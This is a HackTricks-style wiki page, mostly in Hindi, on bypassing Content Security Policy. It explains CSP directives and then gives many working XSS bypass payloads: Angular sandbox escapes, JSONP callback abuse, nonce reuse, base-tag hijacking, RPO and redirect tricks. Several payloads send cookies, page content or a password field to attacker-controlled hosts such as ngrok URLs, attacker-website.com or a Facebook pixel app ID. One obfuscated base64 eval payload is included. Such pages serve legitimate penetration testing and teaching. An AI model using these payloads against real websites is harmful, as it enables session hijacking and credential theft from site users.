# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## CSP क्या है

Content Security Policy (CSP) ब्राउज़र टेक्नोलॉजी के रूप में जानी जाती है, जिसका प्राथमिक उद्देश्य cross-site scripting (XSS) जैसे हमलों से सुरक्षा प्रदान करना है। यह उन स्रोतों और पथों को परिभाषित करके काम करती है जिनसे ब्राउज़र सुरक्षित रूप से संसाधन लोड कर सकता है। ये संसाधन images, frames, और JavaScript जैसे तत्वों को शामिल करते हैं। उदाहरण के लिए, एक policy एक ही डोमेन (self) से संसाधनों के लोड और निष्पादन की अनुमति दे सकती है, जिसमें inline संसाधन और `eval`, `setTimeout`, या `setInterval` जैसे functions के माध्यम से string code का execution भी शामिल हो सकता है।

Implementation of CSP **response headers** के माध्यम से किया जा सकता है या HTML पेज में **meta elements** शामिल करके। इस नीति के अनुसार, ब्राउज़र इन नियमों को सक्रिय रूप से लागू करते हैं और किसी भी पाए गए उल्लंघन को तुरंत ब्लॉक कर देते हैं।

- response header के माध्यम से लागू:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- meta tag के माध्यम से लागू किया गया:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### हेडर

CSP इन हेडर्स का उपयोग करके लागू या मॉनिटर किया जा सकता है:

- `Content-Security-Policy`: CSP को लागू करता है; ब्राउज़र किसी भी उल्लंघन को ब्लॉक कर देता है।
- `Content-Security-Policy-Report-Only`: मॉनिटरिंग के लिए उपयोग होता है; उल्लंघनों की रिपोर्ट करता है बिना उन्हें ब्लॉक किए। प्री-प्रोडक्शन वातावरण में परीक्षण के लिए आदर्श।

### संसाधनों को परिभाषित करना

CSP सक्रिय और निष्क्रिय दोनों प्रकार की सामग्री को लोड करने के लिए स्रोतों को सीमित करता है, और इनलाइन JavaScript के निष्पादन और `eval()` के उपयोग जैसे पहलुओं को नियंत्रित करता है। एक उदाहरण नीति इस प्रकार है:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### निर्देश

- **script-src**: JavaScript के लिए विशिष्ट स्रोतों की अनुमति देता है, जिनमें URLs, इनलाइन स्क्रिप्ट्स, और इवेंट हैंडलर्स या XSLT stylesheets द्वारा ट्रिगर किए गए स्क्रिप्ट्स शामिल हैं।
- **default-src**: जब विशेष fetch निर्देश अनुपस्थित होते हैं तो संसाधनों को फ़ेच करने के लिए डिफ़ॉल्ट पॉलिसी सेट करता है।
- **child-src**: web workers और embedded frame सामग्री के लिए अनुमत स्रोत निर्दिष्ट करता है।
- **connect-src**: उन URLs को प्रतिबंधित करता है जिन्हें fetch, WebSocket, XMLHttpRequest जैसी इंटरफ़ेस के माध्यम से लोड किया जा सकता है।
- **frame-src**: फ्रेम्स के लिए URLs को प्रतिबंधित करता है।
- **frame-ancestors**: यह निर्दिष्ट करता है कि कौन से स्रोत वर्तमान पेज को embed कर सकते हैं; यह `<frame>`, `<iframe>`, `<object>`, `<embed>`, और `<applet>` जैसे elements पर लागू होता है।
- **img-src**: इमेजेस के लिए अनुमत स्रोत परिभाषित करता है।
- **font-src**: `@font-face` का उपयोग करके लोड किए गए fonts के लिए वैध स्रोत निर्दिष्ट करता है।
- **manifest-src**: application manifest फ़ाइलों के लिए अनुमत स्रोत परिभाषित करता है।
- **media-src**: मीडिया ऑब्जेक्ट्स लोड करने के लिए अनुमत स्रोत परिभाषित करता है।
- **object-src**: `<object>`, `<embed>`, और `<applet>` एलिमेंट्स के लिए अनुमत स्रोतों को परिभाषित करता है।
- **base-uri**: `<base>` एलिमेंट्स का उपयोग करके लोड करने के लिए अनुमत URLs निर्दिष्ट करता है।
- **form-action**: फॉर्म सबमिशन के लिए वैध endpoints सूचीबद्ध करता है।
- **plugin-types**: उन mime types को प्रतिबंधित करता है जिन्हें पेज invoke कर सकता है।
- **upgrade-insecure-requests**: ब्राउज़रों को HTTP URLs को HTTPS में rewrite करने का निर्देश देता है।
- **sandbox**: `<iframe>` के sandbox attribute जैसी सीमाएँ लागू करता है।
- **report-to**: नीति के उल्लंघन होने पर रिपोर्ट किस समूह को भेजी जाएगी यह निर्दिष्ट करता है।
- **worker-src**: Worker, SharedWorker, या ServiceWorker स्क्रिप्ट्स के लिए वैध स्रोत निर्दिष्ट करता है।
- **prefetch-src**: उन संसाधनों के लिए वैध स्रोत निर्दिष्ट करता है जिन्हें fetched या prefetched किया जाएगा।
- **navigate-to**: उन URLs को प्रतिबंधित करता है जिन पर दस्तावेज़ किसी भी माध्यम से navigate कर सकता है (a, form, window.location, window.open, आदि)।

### स्रोत

- `*`: उन सभी URLs की अनुमति देता है सिवाय उन schemes के जिनमें `data:`, `blob:`, `filesystem:` होते हैं।
- `'self'`: उसी डोमेन से लोड करने की अनुमति देता है।
- `'data'`: data स्कीम के जरिए संसाधनों को लोड करने की अनुमति देता है (उदा., Base64 एन्कोडेड इमेजेस)।
- `'none'`: किसी भी स्रोत से लोडिंग को ब्लॉक करता है।
- `'unsafe-eval'`: `eval()` और समान मेथड्स के उपयोग की अनुमति देता है; सुरक्षा कारणों से अनुशंसित नहीं।
- `'unsafe-hashes'`: विशिष्ट inline event handlers को सक्षम करता है।
- `'unsafe-inline'`: inline `<script>` या `<style>` जैसी inline resources के उपयोग की अनुमति देता है; सुरक्षा कारणों से अनुशंसित नहीं।
- `'nonce'`: क्रिप्टोग्राफिक nonce (एक बार उपयोग होने वाला नंबर) का उपयोग करके विशिष्ट inline स्क्रिप्ट्स के लिए एक whitelist।
- यदि आपके पास JS सीमित execution है तो पेज के अंदर इस्तेमाल किया गया nonce `doc.defaultView.top.document.querySelector("[nonce]")` से प्राप्त करना संभव है और फिर इसे पुन: उपयोग करके malicious स्क्रिप्ट लोड की जा सकती है (यदि strict-dynamic उपयोग किया गया है, तो किसी भी अनुमत स्रोत द्वारा नए स्रोत लोड किए जा सकते हैं इसलिए यह आवश्यक नहीं होता), जैसे कि:

<details>

<summary>Nonce का पुन: उपयोग कर स्क्रिप्ट लोड करना</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: किसी विशिष्ट sha256 हैश वाले स्क्रिप्ट्स को व्हाइटलिस्ट करता है।
- `'strict-dynamic'`: किसी nonce या हैश द्वारा व्हाइटलिस्ट किए जाने पर किसी भी स्रोत से स्क्रिप्ट लोड करने की अनुमति देता है।
- `'host'`: किसी विशेष host को निर्दिष्ट करता है, जैसे `example.com`।
- `https:`: URLs को उन तक सीमित करता है जो HTTPS का उपयोग करते हैं।
- `blob:`: Blob URLs से resources लोड करने की अनुमति देता है (उदा., JavaScript द्वारा बनाए गए Blob URLs)।
- `filesystem:`: फ़ाइलसिस्टम से resources लोड करने की अनुमति देता है।
- `'report-sample'`: उल्लंघन रिपोर्ट में उल्लंघनकारी कोड का एक नमूना शामिल करता है (डिबगिंग के लिए उपयोगी)।
- `'strict-origin'`: 'self' के समान है लेकिन यह सुनिश्चित करता है कि स्रोतों का प्रोटोकॉल सुरक्षा स्तर दस्तावेज़ के साथ मेल खाता है (केवल secure origins ही secure origins से resources लोड कर पाएंगे)।
- `'strict-origin-when-cross-origin'`: same-origin अनुरोध करते समय पूरा URL भेजता है लेकिन cross-origin अनुरोध में केवल origin भेजता है।
- `'unsafe-allow-redirects'`: ऐसे resources को लोड करने की अनुमति देता है जो तुरंत किसी अन्य resource पर redirect कर देंगे। यह सिफारिश नहीं किया जाता क्योंकि यह सुरक्षा को कमजोर करता है।

## असुरक्षित CSP नियम

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
काम करने वाला payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' द्वारा Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> यह काम नहीं कर रहा है, अधिक जानकारी के लिए [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
कार्यशील payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

यदि आप किसी तरह DOM में अपने JS code के साथ एक **allowed JS code created a new script tag** बना सकते हैं — क्योंकि एक allowed script इसे बना रहा है — तो **new script tag will be allowed to be executed**।

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
काम करने वाला payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-src और default-src की कमी

> [!CAUTION] > **ऐसा लगता है कि यह अब काम नहीं कर रहा है**
```yaml
Content-Security-Policy: script-src 'self' ;
```
काम करने वाले payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### File Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
यदि आप एक JS फाइल अपलोड कर सकते हैं तो आप इस CSP को बायपास कर सकते हैं:

काम करने वाला payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
हालाँकि, यह काफी संभावित है कि server **validating the uploaded file** कर रहा होगा और केवल आपको कुछ निश्चित प्रकार की फाइलें ही **upload करने की अनुमति देगा**।

इसके अलावा, भले ही आप किसी extension (जैसे: _script.png_) का उपयोग करके फ़ाइल के अंदर **JS code inside** अपलोड कर सकें, तब भी यह अक्सर पर्याप्त नहीं होगा क्योंकि कुछ servers जैसे apache server फ़ाइल का MIME type **extension के आधार पर select** करते हैं और ब्राउज़र्स जैसे Chrome उस चीज़ के भीतर मौजूद Javascript code को **execute करने से reject** कर देंगे जो कि एक image होनी चाहिए। "खुशकिस्मती से", गलतियाँ होती हैं। उदाहरण के लिए, एक CTF में मैंने सीखा कि **Apache doesn't know** _**.wave**_ extension, इसलिए यह उसे **MIME type like audio/*** के साथ serve नहीं करता।

From here, यदि आपको XSS और file upload दोनों मिल जाएँ, और आप किसी **misinterpreted extension** को ढूँढने में कामयाब हों, तो आप उस extension के साथ एक फाइल और script का Content upload करने की कोशिश कर सकते हैं। या, यदि server uploaded file के correct format की जांच कर रहा है, तो एक polyglot बनाएँ ([some polyglot examples here](https://github.com/Polydet/polyglot-database))।

### Form-action

यदि JS inject करना संभव न हो, तो आप फिर भी उदाहरण के लिए credentials exfiltrate करने की कोशिश कर सकते हैं — **injecting a form action** (और शायद password managers से passwords auto-fill होने की उम्मीद रखते हुए)। आप एक [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp) देख सकते हैं। साथ ही ध्यान दें कि `default-src` form actions को कवर नहीं करता।

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> For some of the following payload **`unsafe-eval` is not even needed**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
एक vulnerable version of angular लोड करें और arbitrary JS निष्पादित करें:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + एक लाइब्रेरी जिनके फंक्शन्स `window` ऑब्जेक्ट लौटाते हैं ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> यह पोस्ट दिखाती है कि आप `cdn.cloudflare.com` (या किसी अन्य अनुमत JS libraries repo) से सभी **लाइब्रेरीज़** को **लोड** कर सकते हैं, प्रत्येक लाइब्रेरी के जोड़े गए सभी फ़ंक्शन्स को चलाकर, और जांच सकते हैं कि **कौन से फ़ंक्शन किस लाइब्रेरी से `window` ऑब्जेक्ट लौटाते हैं**।
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS एक class name से:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### google recaptcha JS code का दुरुपयोग

इस [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) के अनुसार आप [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) को CSP के अंदर दुरुपयोग करके arbitrary JS code execute कर सकते हैं और CSP को bypass कर सकते हैं:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
अधिक [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### open redirect के लिए www.google.com का दुरुपयोग

निम्नलिखित URL example.com पर redirect करता है (from [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
दुरुपयोग \*.google.com/script.google.com

Google Apps Script का दुरुपयोग करके script.google.com के भीतर एक पेज में जानकारी प्राप्त करना संभव है। जैसा कि [इस रिपोर्ट](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/) में किया गया है।

### तीसरे-पक्ष Endpoints + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
इस तरह के परिदृश्यों में जहाँ `script-src` को `self` और किसी विशेष whitelisted डोमेन पर सेट किया गया हो, उसे JSONP के माध्यम से बायपास किया जा सकता है। JSONP endpoints असुरक्षित callback methods की अनुमति देते हैं जो एक attacker को XSS अंजाम देने की अनुमति देते हैं, working payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **तैयार उपयोग के लिए JSONP endpoints प्रदान करता है जो विभिन्न वेबसाइटों के CSP bypass के लिए हैं।**

The same vulnerability will occur if the **trusted endpoint contains an Open Redirect** because if the initial endpoint is trusted, redirects are trusted.

### तृतीय-पक्ष दुरुपयोग

As described in the [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), ऐसे कई third-party domains हैं, जिन्हें CSP में कहीं न कहीं allow किया गया हो सकता है, और उनका दुरुपयोग data exfiltrate करने या JavaScript code execute करने के लिए किया जा सकता है। इनमें से कुछ third-parties हैं:

| Entity            | Allowed Domain                               | Capabilities |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

यदि आप अपने लक्ष्य की CSP में किसी भी allowed domain को पाते हैं, तो संभावना है कि आप third-party सेवा पर register करके CSP को bypass कर सकते हैं और या तो data exfiltrate कर सकते हैं उस सेवा पर या code execute करवा सकते हैं।

For example, if you find the following CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
या
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
आप exfiltrate data करने में सक्षम होने चाहिए, ठीक उसी तरह जैसे यह हमेशा [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) के साथ किया गया है। इस मामले में, आप सामान्यतः निम्न चरणों का पालन करते हैं:

1. यहाँ एक Facebook Developer account बनाएं.
2. एक नया "Facebook Login" app बनाएं और "Website" चुनें.
3. "Settings -> Basic" पर जाएं और अपना "App ID" प्राप्त करें.
4. जिस target site से आप exfiltrate data करना चाहते हैं, आप सीधे Facebook SDK gadget "fbq" का उपयोग करके एक "customEvent" और data payload के माध्यम से data exfiltrate कर सकते हैं.
5. अपने App के "Event Manager" में जाएं और आपने जो application बनाया है उसे चुनें (ध्यान दें कि event manager इस तरह के URL में मिल सकता है: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. "Test Events" टैब चुनें ताकि आप "your" web site द्वारा भेजे जा रहे events देख सकें.

फिर, victim साइड पर, आप निम्न code को execute करते हैं ताकि Facebook tracking pixel को attacker के Facebook developer account app-id की ओर initialize किया जा सके और इस तरह एक custom event issue किया जा सके:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
पिछली तालिका में निर्दिष्ट बाकी सात third-party domains के लिए, उन्हें abuse करने के कई अन्य तरीके हैं। अन्य third-party abuses के बारे में अतिरिक्त व्याख्याओं के लिए पहले दिए गए [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) को देखें।

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

पाथ प्रतिबंधों को bypass करने के लिए उपरोक्त redirection के अलावा, कुछ सर्वरों पर Relative Path Overwrite (RPO) नामक एक और technique इस्तेमाल की जा सकती है।

उदाहरण के लिए, यदि CSP allows the path `https://example.com/scripts/react/`, तो इसे निम्नलिखित तरीके से bypass किया जा सकता है:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
ब्राउज़र अंततः `https://example.com/scripts/angular/angular.js` लोड करेगा।

यह इसलिए काम करता है क्योंकि ब्राउज़र के लिए आप `https://example.com/scripts/react/` के अंतर्गत `..%2fangular%2fangular.js` नाम की फ़ाइल लोड कर रहे हैं, जो CSP के अनुरूप है।

∑, वे इसे डिकोड कर देंगे, और प्रभावी रूप से `https://example.com/scripts/react/../angular/angular.js` का अनुरोध करेंगे, जो `https://example.com/scripts/angular/angular.js` के बराबर है।

ब्राउज़र और सर्वर के बीच URL व्याख्या में इस असंगति का **शोषण करके, path rules को बाईपास किया जा सकता है**।

समाधान यह है कि server-side पर `%2f` को `/` के रूप में न माना जाए, ताकि ब्राउज़र और सर्वर के बीच व्याख्या संगत रहे और यह समस्या न हो।

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS निष्पादन


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### **base-uri** अनुपस्थित

यदि **base-uri** निर्देश गायब है तो आप इसका दुरुपयोग करके [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html) कर सकते हैं।

Moreover, if the **page is loading a script using a relative path** (like `<script src="/js/app.js">`) using a **Nonce**, you can abuse the **base** **tag** to make it **लोड** the script from **अपने सर्वर से XSS हासिल कर सकते हैं।**\
```html
<base href="https://www.attacker.com/" />
```
### AngularJS इवेंट्स

एक विशेष नीति जिसे Content Security Policy (CSP) कहा जाता है, JavaScript इवेंट्स को प्रतिबंधित कर सकती है। फिर भी, AngularJS वैकल्पिक के रूप में कस्टम इवेंट्स पेश करता है। किसी इवेंट के अंदर, AngularJS एक विशिष्ट ऑब्जेक्ट `$event` प्रदान करता है, जो मूल ब्राउज़र इवेंट ऑब्जेक्ट का संदर्भ देता है। इस `$event` ऑब्जेक्ट का उपयोग CSP को बाईपास करने के लिए किया जा सकता है। खासकर Chrome में, `$event/event` ऑब्जेक्ट में एक `path` एट्रिब्यूट होता है, जो इवेंट के निष्पादन श्रृंखला में शामिल ऑब्जेक्ट्स की एक array रखता है, और `window` ऑब्जेक्ट हमेशा अंत में स्थित होता है। यह संरचना sandbox escape तकनीकों के लिए महत्वपूर्ण है।

इस array को `orderBy` filter की ओर निर्देशित करके, इसे iterate किया जा सकता है और अंतिम तत्व (the `window` object) का उपयोग करके global function जैसे `alert()` को ट्रिगर किया जा सकता है। नीचे दिया गया कोड स्निपेट इस प्रक्रिया को स्पष्ट करता है:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
यह स्निपेट दिखाता है कि इवेंट ट्रिगर करने के लिए `ng-focus` directive का उपयोग कैसे किया जाता है, `$event.path|orderBy` द्वारा `path` array में हेरफेर कैसे किया जाता है, और `window` object का उपयोग करके `alert()` function चलाकर `document.cookie` कैसे प्रकट होता है।

**अन्य Angular bypasses खोजने के लिए देखें** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS और whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Angular JS एप्लिकेशन में स्क्रिप्ट लोड करने के लिए डोमेन्स को व्हाइटलिस्ट करने वाली CSP नीति को callback functions के कॉल और कुछ vulnerable classes के माध्यम से बायपास किया जा सकता है। इस तकनीक पर विस्तृत जानकारी इस [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22) में मौजूद गाइड में मिलती है।

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
अन्य JSONP arbitrary execution endpoints को [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) में पाया जा सकता है (उनमें से कुछ हटाए गए या ठीक किए गए थे)

### Bypass via Redirection

जब CSP को server-side redirection मिलता है तो क्या होता है? अगर redirection किसी ऐसे अलग origin की ओर ले जाता है जो allowed नहीं है, तो यह फिर भी विफल होगा।

हालाँकि, [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) में दिए गए विवरण के अनुसार, अगर redirection किसी अलग path की ओर ले जाता है, तो यह original restrictions को bypass कर सकता है।

यहाँ एक उदाहरण है:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
यदि CSP `https://www.google.com/a/b/c/d` पर सेट है, तो चूँकि पाथ पर विचार किया जाता है, दोनों `/test` और `/a/test` स्क्रिप्ट्स CSP द्वारा ब्लॉक कर दी जाएँगी।

हालाँकि, अंतिम `http://localhost:5555/301` सर्वर-साइड पर **`https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`** पर रीडायरेक्ट कर दिया जाएगा। चूँकि यह एक रीडायरेक्शन है, **पाथ पर विचार नहीं किया जाएगा**, और **स्क्रिप्ट लोड की जा सकती है**, इस तरह पाथ प्रतिबंध बायपास हो जाएगा।

इस रीडायरेक्शन के साथ, भले ही पाथ पूरी तरह से निर्दिष्ट किया गया हो, यह फिर भी बायपास हो जाएगा।

इसलिए, सबसे अच्छा समाधान यह सुनिश्चित करना है कि वेबसाइट में कोई open redirect vulnerabilities न हों और CSP नियमों में ऐसे कोई डोमेन न हों जिनका शोषण किया जा सके।

### Bypass CSP with dangling markup

Read [how here](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` का मतलब है कि आप code के अंदर कोई भी script execute कर सकते हैं (XSS code execute कर सकता है) और `img-src *` का मतलब है कि आप webpage में किसी भी resource से कोई भी image इस्तेमाल कर सकते हैं।

आप इस CSP को images के जरिए data exfiltrate करके bypass कर सकते हैं (इस उदाहरण में XSS एक CSRF का दुरुपयोग करता है जहाँ bot द्वारा access की जा सकने वाली एक page में SQLi मौजूद है, और image के जरिए flag निकालता है):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

आप इस कॉन्फ़िगरेशन का दुरुपयोग करके **load javascript code inserted inside an image** भी कर सकते हैं। उदाहरण के लिए, अगर पेज Twitter से images लोड करने की अनुमति देता है तो आप एक **special image** तैयार करके उसे Twitter पर **upload** कर सकते हैं और "**unsafe-inline**" का दुरुपयोग करके एक JS code (एक सामान्य XSS की तरह) **execute** करवा सकते हैं जो उस **image** को **load** करेगा, उसमें से **JS** को **extract** करेगा और **execute** **it**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### With Service Workers

Service workers का **`importScripts`** function CSP द्वारा सीमित नहीं है:

{{#ref}}
